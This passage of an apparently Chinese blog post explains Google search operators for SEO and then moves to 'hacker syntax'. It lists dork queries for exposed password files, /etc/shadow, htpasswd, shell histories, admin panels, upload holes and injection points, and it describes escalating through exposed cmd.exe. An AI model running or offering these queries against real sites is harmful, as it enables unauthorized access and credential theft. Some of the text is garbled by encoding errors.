lang="EN-US"> SEO</span>上传工具，也可能有<span lang="EN-US">SEO</span>分析工具。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;&nbsp;&nbsp; Related </span>的使用方法是：<span lang="EN-US">&ldquo;Related:URL</span>链接<span lang="EN-US">&rdquo;</span>。使用这种<span lang="EN-US">Google</span>搜索方法，搜索结果将展示与这个<span lang="EN-US">URL</span>链接页面相关的页面。<span lang="EN-US">&ldquo;</span>相关<span lang="EN-US">&rdquo;</span>除了和该页面内容相关的页面外，还包括这个页面的导入链接和导出链接所指向的页面。比如说：<span lang="EN-US">Related:dhgate.com</span>。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;&nbsp;&nbsp; Ext</span>的使用方法是：<span lang="EN-US">&ldquo;Ext:</span>文件后缀<span lang="EN-US">&rdquo;</span>。它可以帮你搜索各种后缀格式的文件。比如说：</p><p class="MsoNormal"><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xls (</span>微软<span lang="EN-US"> Excel)</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ppt (</span>微软<span lang="EN-US"> PowerPoint)</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; doc (</span>微软<span lang="EN-US"> Word)</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pdf (Adobe </span>文件<span lang="EN-US">)</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; html or htm (HTML</span>代码文件<span lang="EN-US">)</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;&nbsp;&nbsp; Cache</span>的使用方法是：<span lang="EN-US">&ldquo;cache:URL</span>链接<span lang="EN-US">&rdquo;</span>。搜索显示的是某个链接在<span lang="EN-US">Google</span>服务器上的缓存。很多用户不直接访问该页面，而使用缓存有<span lang="EN-US">2</span>个好处：<span lang="EN-US">a.</span>对于有潜在危险的页面，缓存更加安全。<span lang="EN-US">b.</span>缓存有可能比直接访问网站服务器更快。<span lang="EN-US">c.</span>很多页面也许已经被删除了，而缓存还存在。比如说：<span lang="EN-US">cache:seomao.com</span>。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;&nbsp;&nbsp; Inanchor</span>的使用方法是：<span lang="EN-US">inanchor:</span>关键词。搜索结果中必须出现以这个关键词为链接关键词的链接。比如说<span lang="EN-US"> &ldquo;inanchor:seo</span>资料<span lang="EN-US">&rdquo; </span>将显示以<span lang="EN-US">&ldquo;SEO</span>资料<span lang="EN-US">&rdquo;</span>为链接关键词的页面。此搜索时常被用来做关键词的竞争研究比较。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">熟练的掌握以上的几种<span lang="EN-US">Google</span>高级搜索方法，并且将他们交叉使用，将让你的搜索结果更加准确和有效，比如说：</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;&nbsp;&nbsp; &ldquo;site:seomao.com </span>站内<span lang="EN-US">SEO&rdquo;</span>将帮助你更快更准确的找到<span lang="EN-US">SEOmao.com</span>里面关于<span lang="EN-US">&ldquo;</span>站内<span lang="EN-US">SEO&rdquo;</span>的<span lang="EN-US">SEO</span>资料。或者针对你的特殊需求使用：<span lang="EN-US">&ldquo;site:seomao.com intitle:</span>站内<span lang="EN-US">seo&rdquo;</span>，<span lang="EN-US"> &ldquo;site:seomao.com inurl:seo list&rdquo;</span>，<span lang="EN-US">&ldquo; site:seomao.com inurl:seo list&rdquo;</span>，<span lang="EN-US">&ldquo; site:seomao.com inanchor:</span>链接<span lang="EN-US">&rdquo;</span>。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;&nbsp;&nbsp; &ldquo;site.rg + </span>关键词<span lang="EN-US">&rdquo;</span>将帮助你更好的找到建立<span lang="EN-US">SEO</span>外链所需要的目标网站。比如说：<span lang="EN-US">&ldquo;siterg </span>搜索引擎优化<span lang="EN-US">&rdquo;</span>。</p><p>&nbsp;</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p>&nbsp;</p><p class="MsoNormal"><span lang="EN-US">[ intitle: ]</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">按标题搜索帮助<span lang="EN-US">google</span>限定了你搜索的结果，只有那些标题含有你指定的关键词的页面会返回给你。例如<span lang="EN-US">&ldquo;intitle: login password&rdquo;</span>会返回标题含有<span lang="EN-US">login</span>，而页面里面随便什么地方含有<span lang="EN-US">password</span>的网页给你。</p><p class="MsoNormal">当你想在标题里面搜索超过<span lang="EN-US">2</span>个词的时候，你可以使用<span lang="EN-US">&ldquo;allintitle:&rdquo; </span>，当然也可以使用<span lang="EN-US">&ldquo;intitle&rdquo;</span>来代替搜索，<span lang="EN-US">&ldquo;intitle: login intitle: password&rdquo; </span>和<span lang="EN-US">&ldquo;allintitle: login password&rdquo;</span>的搜索结果是一样的。</p><p class="MsoNormal"><span lang="EN-US">[ inurl: ]</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">按链接搜索返回那些网址<span lang="EN-US">url</span>里面包含你指定关键词的页面。例如<span lang="EN-US">&ldquo;inurl: passwd&rdquo; </span>，返回那些网址<span lang="EN-US">url</span>里面包含你指定关键词<span lang="EN-US">passwd</span>的页面。同上，如果你想在网址里搜索多个关键词，你可以使用<span lang="EN-US">&ldquo;allinurl:&rdquo;</span>语法。例如<span lang="EN-US">&ldquo;allinurl: etc/passwd&ldquo; </span>会搜索网址里含有<span lang="EN-US">etc</span>和<span lang="EN-US">passwd</span>的网页，斜杠<span lang="EN-US">&ldquo;/&rdquo;</span>会被<span lang="EN-US">google</span>忽略。</p><p class="MsoNormal"><span lang="EN-US">[ site: ]</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">语法&ldquo;<span lang="EN-US">site:&rdquo;</span>只搜索指定网域里的关键词，例如<span lang="EN-US">&ldquo;exploits site:hackingspirits.com&rdquo;</span>将搜索<span lang="EN-US">hackingspirits.com</span>网站上的所有包含<span lang="EN-US">exploits</span>的页面。</p><p class="MsoNormal"><span lang="EN-US">[ filetype: ]</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">按指定文件类型即后缀搜索（例如<span lang="EN-US">doc</span>、<span lang="EN-US">pdf</span>或<span lang="EN-US">ppt</span>等等）。例如<span lang="EN-US">&ldquo;filetype:doc site:gov confidential&rdquo;</span>将搜索所有<span lang="EN-US">.gov</span>的政府网站上的<span lang="EN-US">.doc</span>文件和含有<span lang="EN-US">confidential</span>关键字的页面，或者是<span lang="EN-US">.doc</span>文件里面含有关键字<span lang="EN-US">confidential</span>的页面，这意味着搜索结果将返回政府网站上所有机密的<span lang="EN-US">.doc</span>文件。</p><p class="MsoNormal"><span lang="EN-US">[ link: ]</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">按引用搜索将列出所有包含特定链接的页面，例如<span lang="EN-US">&ldquo;link:www.securityfocus.com&rdquo;</span>将列出所有包含指向<span lang="EN-US">Securityfocus</span>主页的网址的页面。</p><p class="MsoNormal"><span lang="EN-US">[ related: ]</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">按相似搜索将列出与指定网页相似的页面，例如&ldquo;<span lang="EN-US">related:www.securityfocus.com&rdquo;</span>将返回与<span lang="EN-US">Securityfocus</span>筑页相似的页面。注意在<span lang="EN-US">&ldquo;related:&rdquo;</span>与网址间不可以有空格。</p><p class="MsoNormal"><span lang="EN-US">[cache: ]</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">网页快照，<span lang="EN-US">google</span>将返回给你他储存下来的历史页面。如果你同时指定了其他查询词，<span lang="EN-US">google</span>将在搜索结果里以高亮显示。例如查询<span lang="EN-US">&ldquo;cache: www.hackingspirits.com guest&rdquo;</span>在返回的结果里将高亮显示<span lang="EN-US">&rdquo;guest&rdquo;</span>。（受<span lang="EN-US">gfw</span>影响，在大陆应该是用不了的）</p><p class="MsoNormal"><span lang="EN-US">[ intext: ]</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">intext:&rdquo;</span>寻找特定网页里的关键字，他不理会网址和文章标标题。例如<span lang="EN-US">&ldquo;intext:exploits&rdquo;</span>将只返回包含指定关键字<span lang="EN-US">&ldquo;exploits&rdquo;</span>的网页的地址。</p><p class="MsoNormal"><span lang="EN-US">[ phonebook: ]</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">电话簿查询美国街道地址和电话号码信息。例如<span lang="EN-US">&ldquo;phonebookisa+CA&rdquo;</span>将查询名字里面包含<span lang="EN-US">&ldquo;Lisa&rdquo;</span>并住在加州的人的所有名字。这对黑客使用社会工程学去挖掘个人信息是很有用的。</p><p class="MsoNormal"><span lang="EN-US">[Index of]</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">利用&ldquo;<span lang="EN-US">Index of &rdquo;</span>语法去发现允许目录浏览的<span lang="EN-US">web</span>网站，就象在本地的普通目录一样。下面是一些有趣的查询：</p><p class="MsoNormal"><span lang="EN-US">Index of /admin</span></p><p class="MsoNormal"><span lang="EN-US">Index of /passwd</span></p><p class="MsoNormal"><span lang="EN-US">Index of /password</span></p><p class="MsoNormal"><span lang="EN-US">Index of /mail</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">Index of /&rdquo; +passwd</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">Index of /&rdquo; +password.txt</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">Index of /&rdquo; +.htaccess</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">Index of /root&rdquo;</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">Index of /cgi-bin&rdquo;</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">Index of /logs&rdquo;</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">Index of /config&rdquo;</span></p><p class="MsoNormal">（包含引号）</p><p class="MsoNormal"><span lang="EN-US">[</span>利用<span lang="EN-US">&ldquo;inurl:&rdquo;</span>或<span lang="EN-US">&ldquo;allinurl:&rdquo;</span>寻找有漏洞的网站或服务器<span lang="EN-US">]</span></p><p class="MsoNormal"><span lang="EN-US">a</span>、利用<span lang="EN-US">&ldquo;allinurl:winnt/system32/&rdquo;</span>查询：列出的服务器上本来应该受限制的诸如<span lang="EN-US">&ldquo;system32&rdquo;</span>等目录，如果你运气足够好，你会发现<span lang="EN-US">&ldquo;system32&rdquo;</span>目录里的<span lang="EN-US">&ldquo;cmd.exe&rdquo;</span>文件，并能执行他，接下来就是提升权限并攻克了。</p><p class="MsoNormal"><span lang="EN-US">b</span>、查询<span lang="EN-US">&ldquo;allinurl:wwwboard/passwd.txt&rdquo;</span>将列出所有有<span lang="EN-US">&ldquo;WWWBoard Password vulnerability&rdquo;</span>漏洞的服务器，阅读更多请参见下面链接。<span lang="EN-US">http://www.securiteam.com/exploits/2BUQ4S0SAW.html</span></p><p class="MsoNormal"><span lang="EN-US">c</span>、查询<span lang="EN-US">&ldquo;inurl:.bash_history&rdquo;</span>将列出互联网上可以看见<span lang="EN-US">&ldquo;inurl:.bash_history&rdquo;</span>文件的服务器。这是一个命令历史文件，这个文件包含了管理员执行的命令，有时会包含一些敏感信息比如管理员键入的密码。</p><p class="MsoNormal"><span lang="EN-US">d</span>、查询<span lang="EN-US">&ldquo;inurl:config.txt&rdquo;</span>将看见网上暴露了<span lang="EN-US">&ldquo;inurl:config.txt&rdquo;</span>文件的服务器，这个文件包含了经过哈希编码的管理员的密码和数据库存取的关键信息。</p><p class="MsoNormal"><span lang="EN-US">e</span>、还有一些其他一些使用<span lang="EN-US">&ldquo;inurl:&rdquo;</span>和<span lang="EN-US">&ldquo;allinurl:&rdquo;</span>查询组合的例子。</p><p class="MsoNormal"><span lang="EN-US">inurl:admin filetype:txt</span></p><p class="MsoNormal"><span lang="EN-US">inurl:admin filetype:db</span></p><p class="MsoNormal"><span lang="EN-US">inurl:admin filetype:cfg</span></p><p class="MsoNormal"><span lang="EN-US">inurl:mysql filetype:cfg</span></p><p class="MsoNormal"><span lang="EN-US">inurl:passwd filetype:txt</span></p><p class="MsoNormal"><span lang="EN-US">inurl:&rdquo;wwwroot/*.&rdquo;</span></p><p class="MsoNormal"><span lang="EN-US">inurl:adpassword.txt</span></p><p class="MsoNormal"><span lang="EN-US">inurl:webeditor.php</span></p><p class="MsoNormal"><span lang="EN-US">inurl:file_upload.php</span></p><p class="MsoNormal"><span lang="EN-US">inurl:gov filetype:xls &ldquo;restricted&rdquo;</span></p><p class="MsoNormal"><span lang="EN-US">index of ftp +.mdb allinurl:/cgi-bin/ +mailto</span></p><p class="MsoNormal">（以上查询包含引号）</p><p class="MsoNormal"><span lang="EN-US">[</span>利用<span lang="EN-US">&ldquo;intitle:&rdquo;</span>和<span lang="EN-US">&ldquo;allintitle:&rdquo;</span>寻找有漏洞的服务器<span lang="EN-US">]</span></p><p class="MsoNormal"><span lang="EN-US">a</span>、通过<span lang="EN-US">[allintitle: &ldquo;index of /root&rdquo;] </span>查询列出有<span lang="EN-US">&ldquo;root&rdquo;</span>目录存取权限的服务器的列表，这个目录经常包含敏感信息，通过这些信息服务器可能会被轻易攻克。</p><p class="MsoNormal"><span lang="EN-US">b</span>、通过<span lang="EN-US">[allintitle:&ldquo;index of /admin&rdquo;] </span>查询列出有<span lang="EN-US">&ldquo;admin&rdquo;</span>目录列表权限的服务器的，绝大部分<span lang="EN-US">web </span>程序使用<span lang="EN-US">&ldquo;admin&rdquo;</span>用户名去储存管理员权限。这个目录下的敏感信息可能会被利用来轻易地攻克服务器。</p><p class="MsoNormal"><span lang="EN-US">inurl:</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">inurl:</span>是黑客重要的搜寻方法，可搜到网址包括的关键词，例如填上<span lang="EN-US">allinurl:login password</span>作搜寻，便会很易找到有<span lang="EN-US">login</span>和<span lang="EN-US">password</span>的网页。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<span lang="EN-US">-</span></p><p class="MsoNormal"><span lang="EN-US">filetype:</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">filetype:</span>是黑客专用语法，例如想找<span lang="EN-US">mdb</span>的数据库档案，可用<span lang="EN-US">password filetype:mdb</span>作搜寻，便会找到密码文件，进阶用法可配合<span lang="EN-US">inurl:</span>使用，例如<span lang="EN-US">girl filetype:jpg site:com </span>便可搜到所有标题<span lang="EN-US">.com</span>网站，而档案为<span lang="EN-US">girl.jp</span>或网页内容有<span lang="EN-US">girl</span>字符串的。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<span lang="EN-US">-</span></p><p class="MsoNormal"><span lang="EN-US">Index of /admin</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">搜到的结果大多数是容野峇嵺<span lang="EN-US">@ index browsing</span>的网站，随便按下一个连结便看到网站的文件夹和档案分布。</p><p class="MsoNormal">&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<span lang="EN-US">-</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">Index of /&rdquo; +password.txt</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">有些站长会将密码储存成<span lang="EN-US">password.txt</span>档案，如配合<span lang="EN-US">index browsing</span>的弁遄<span lang="EN-US">A</span>将<span lang="EN-US">google</span>的关键字符串成<span lang="EN-US">&ldquo;Index of /&rdquo; +password.txt</span>作搜寻，便找到很多<span lang="EN-US">password.txt</span></p><p class="MsoNormal">&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<span lang="EN-US">-</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">以下还有更多输入搜寻法，有时间可自行玩玩！</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">Index of /admin&rdquo;</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">Index of /password&rdquo;</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">Index of /mail&rdquo;</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">Index of /&rdquo; +passwd</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">Index of /&rdquo; +password.txt</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">Index of /&rdquo; +.htaccess</span></p><p class="MsoNormal"><span lang="EN-US">index of ftp +.mdb allinurl:/cgi-bin/ +mailto</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">administrators.pwd.index</span></p><p class="MsoNormal"><span lang="EN-US">authors.pwd.index</span></p><p class="MsoNormal"><span lang="EN-US">service.pwd.index</span></p><p class="MsoNormal"><span lang="EN-US">filetype:config web</span></p><p class="MsoNormal"><span lang="EN-US">gobal.asax index</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">allintitle: &ldquo;index of/admin&rdquo;</span></p><p class="MsoNormal"><span lang="EN-US">allintitle: &ldquo;index of/root&rdquo;</span></p><p class="MsoNormal"><span lang="EN-US">allintitle: sensitive filetype:doc</span></p><p class="MsoNormal"><span lang="EN-US">allintitle: restricted filetype :mail</span></p><p class="MsoNormal"><span lang="EN-US">allintitle: restricted filetype:doc site:gov</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">inurl:passwd filetype:txt</span></p><p class="MsoNormal"><span lang="EN-US">inurl:admin filetype:db</span></p><p class="MsoNormal"><span lang="EN-US">inurl:iisadmin</span></p><p class="MsoNormal"><span lang="EN-US">inurl:&rdquo;auth_user_file.txt&rdquo;</span></p><p class="MsoNormal"><span lang="EN-US">inurl:&rdquo;wwwroot/*.&rdquo;</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">top secret site:mil</span></p><p class="MsoNormal"><span lang="EN-US">confidential site:mil</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">allinurl: winnt/system32/ (get cmd.exe)</span></p><p class="MsoNormal"><span lang="EN-US">allinurl:/bash_history</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">intitle:&rdquo;Index of&rdquo; .sh_history</span></p><p class="MsoNormal"><span lang="EN-US">intitle:&rdquo;Index of&rdquo; .bash_history</span></p><p class="MsoNormal"><span lang="EN-US">intitle:&rdquo;index of&rdquo; passwd</span></p><p class="MsoNormal"><span lang="EN-US">intitle:&rdquo;index of&rdquo; people.lst</span></p><p class="MsoNormal"><span lang="EN-US">intitle:&rdquo;index of&rdquo; pwd.db</span></p><p class="MsoNormal"><span lang="EN-US">intitle:&rdquo;index of&rdquo; etc/shadow</span></p><p class="MsoNormal"><span lang="EN-US">intitle:&rdquo;index of&rdquo; spwd</span></p><p class="MsoNormal"><span lang="EN-US">intitle:&rdquo;index of&rdquo; master.passwd</span></p><p class="MsoNormal"><span lang="EN-US">intitle:&rdquo;index of&rdquo; htpasswd</span></p><p class="MsoNormal"><span lang="EN-US">intitle:&rdquo;index of&rdquo; members OR accounts</span></p><p class="MsoNormal"><span lang="EN-US">intitle:&rdquo;index of&rdquo; user_carts OR user_cart</span></p><p class="MsoNormal"><span lang="EN-US">google</span>上的黑客语法</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">察看基本情况：</p><p class="MsoNormal"><span lang="EN-US">inurl:*.asp </span>返回一些基本信息</p><p class="MsoNormal"><span lang="EN-US">site:xx.com </span>返回所有与该有关的<span lang="EN-US">url</span></p><p class="MsoNormal"><span lang="EN-US">link:xx.com </span>返回所有与该站做了连接的站</p><p class="MsoNormal"><span lang="EN-US">site:xx.com filetype:txt </span>查找<span lang="EN-US">TXT</span>文件其他的依次内推</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">查找后台</p><p class="MsoNormal"><span lang="EN-US">site:xx.com intext:</span>管理</p><p class="MsoNormal"><span lang="EN-US">site:xx.com inurl:login</span></p><p class="MsoNormal"><span lang="EN-US">site:xx.com intitle:</span>后台</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">查看服务器使用的程序</p><p class="MsoNormal"><span lang="EN-US">site:xx.com filetype:asp</span></p><p class="MsoNormal"><span lang="EN-US">site:xx.com filetype:php</span></p><p class="MsoNormal"><span lang="EN-US">site:xx.com filetype:jsp</span></p><p class="MsoNormal"><span lang="EN-US">site:xx.com filetype:aspx</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">查看上传漏洞：</p><p class="MsoNormal"><span lang="EN-US">site:xx.com inurl:file</span></p><p class="MsoNormal"><span lang="EN-US">site:xx.com inurl:load</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">查找注射点<span lang="EN-US">GhostEye</span>觉的这些指令不管在精确查找资料还是对于做<span lang="EN-US">SEO</span>的朋友都是非常有用的</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">以下是目前所有的<span lang="EN-US">Google</span>搜索命令语法，它不同于<span lang="EN-US">Google</span>的帮助文档，因为这里介绍了几个<span lang="EN-US">Google</span>不推荐使用的命令语法。大多数的<span lang="EN-US">Google</span>搜索命令语法有它特有的使用格式，希望大家能正确使用。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">allinanchor: anchor</span>是一处说明性的文字，它标注说明了这个链接可能跳转到其它的网页或跳转到当前网页的不同地方。当我们用<span lang="EN-US">allinanchor</span>提交查询的时候，<span lang="EN-US">Google</span>会限制搜索结果必须是那些在<span lang="EN-US">anchor</span>文字里包含了我们所有查询关键词的网页。例<span lang="EN-US">[ allinanchor: best museums Sydney ] ,</span>提交这个查询，<span lang="EN-US">Google</span>仅仅会返回在网页<span lang="EN-US">anchor</span>说明文字里边包含了关键词<span lang="EN-US">&rdquo;best&rdquo; &ldquo;museums&rdquo; </span>和<span lang="EN-US">&rdquo;Sydney&rdquo;</span>的网面。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">allintext: </span>当我们用<span lang="EN-US">allintext</span>提交查询的时候，<span lang="EN-US">Google</span>会限制搜索结果仅仅是在网页正文里边包含了我们所有查询关键词的网页。例［<span lang="EN-US">allintext: travel packing list</span>］<span lang="EN-US">,</span>提交这个查询，<span lang="EN-US">Google</span>仅仅会返回在一个网页包含了三个关键词<span lang="EN-US">&rdquo;travel&rdquo; &ldquo;packing&rdquo;</span>和<span lang="EN-US">&rdquo;list&rdquo;</span>的网页。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">allintitle: </span>当我们用<span lang="EN-US">allintitle</span>提交查询的时候，<span lang="EN-US">Google</span>会限制搜索结果仅是那些在网页标题里边包含了我们所有查询关键词的网页。例［<span lang="EN-US">allintitle: detect plagiarism</span>］，提交这个查询，<span lang="EN-US">Google</span>仅会返回在网页标题里边包含了<span lang="EN-US">&rdquo;detect&rdquo;</span>和<span lang="EN-US">&rdquo;plagiarism&rdquo;</span>这两个关键词的网页。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">allinurl: </span>当我们用<span lang="EN-US">allinurl</span>提交查询的时候，<span lang="EN-US">Google</span>会限制搜索结果仅是那些在<span lang="EN-US">URL</span>（网址）里边包含了我们所有查询关键词的网页。例［<span lang="EN-US">allinurl: google faq</span>］，提交这个查询，<span lang="EN-US">Google</span>仅会返回在<span lang="EN-US">URL</span>里边包含了关键词<span lang="EN-US">&rdquo;google&rdquo;</span>和<span lang="EN-US">&rdquo;faq&rdquo;</span>的网页，象<span lang="EN-US">www.google.com/help /faq.html</span>等的网页。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">author: </span>当我们用<span lang="EN-US">author</span>进行查询的时候，<span lang="EN-US">Google</span>会限制返回结果仅仅是那些在<span lang="EN-US">Google</span>论坛里边，包含了特定作者的新闻文章。在这里，作者名可以是全名，也可以是一部分或邮件地址。例［<span lang="EN-US">children author:john author:doe</span>］或［<span lang="EN-US">children author:doe@someaddress.com</span>］返回结果将是作者<span lang="EN-US">John Doe </span>或是<span lang="EN-US"> doe@someaddress.com</span>写的，关于包含关键词<span lang="EN-US">children</span>的文章。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">bphonebook: </span>用<span lang="EN-US">bphonebook</span>进行查询的时候，返回结果将是那些商务电话资料。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">cache: </span>提交<span lang="EN-US">cache:url </span>，<span lang="EN-US">Google</span>会显示当前网页的快照信息，从而替换网页的当前信息。例［<span lang="EN-US">cache:www.eff.org</span>］，提交这个查询，<span lang="EN-US">Google</span>会返回所有抓取的关于<span lang="EN-US">www.eff.org</span>的网页快照信息。在显示的网页快照信息里边，<span lang="EN-US">Google</span>会高亮显示查询关键词。（在<span lang="EN-US">cache:</span>和<span lang="EN-US">URL</span>之间不能有空格）</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">datarange: </span>当我们使用<span lang="EN-US">datarange</span>进行查询的时候，<span lang="EN-US">Google</span>会将查询结果限制在一个特定的时间段内，这个时间相对于网站来说，是按网站被<span lang="EN-US">google</span>收录的时间算的。例　<span lang="EN-US">&ldquo;Geri </span></p><p class="MsoNormal"><span lang="EN-US">Halliwell&rdquo; &ldquo;Spice Girls&rdquo; daterange:2450958-2450968</span>　。这里的时间日期格式是按天文学的儒略日。（这个搜索语法<span lang="EN-US">Google</span>并不推荐使用，因为它会返回一些莫名其妙的东西）</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">define: </span>当我们用<span lang="EN-US">define</span>进行查询的时候，<span lang="EN-US">Google</span>会返回包含查询关键词定义的网面。例［<span lang="EN-US">define: blog</span>］，这个查询将会返回<span lang="EN-US">Blog</span>的定义。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">ext: </span>这是一个没有证实的语法，可以用于<span lang="EN-US">filetype:</span>查找扩散名为<span lang="EN-US">ext</span>的文件。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">filetype: </span>当我们在查询里边包含<span lang="EN-US">filetype:</span>扩展名的时候，<span lang="EN-US">Google</span>会限制查询结果仅返回特定文件类型的网页。例［资产评估　<span lang="EN-US"> filetype:pdf</span>］，这个查询将会返回所有文件类型为<span lang="EN-US">pdf</span>的资产评估信息。其它可用的特定文件类型格式查询还有<span lang="EN-US">doc ,txt,ppt,xls.rtf,swf,ps</span>等。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">group: </span>当我们用<span lang="EN-US">group</span>查询的时候，<span lang="EN-US">Google</span>会限制我们的论坛查询结果仅是某几个固定的论坛组或是某些特定主题组的新闻文章。例［<span lang="EN-US">sleep group:misc.kids.moderated</span>］，提交这个查询，<span lang="EN-US">Google</span>仅会返回在用户组<span lang="EN-US">misc.kids.moderated</span>里边包含了查询关键字<span lang="EN-US">&rdquo;sleep&rdquo;</span>的文章。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">id: 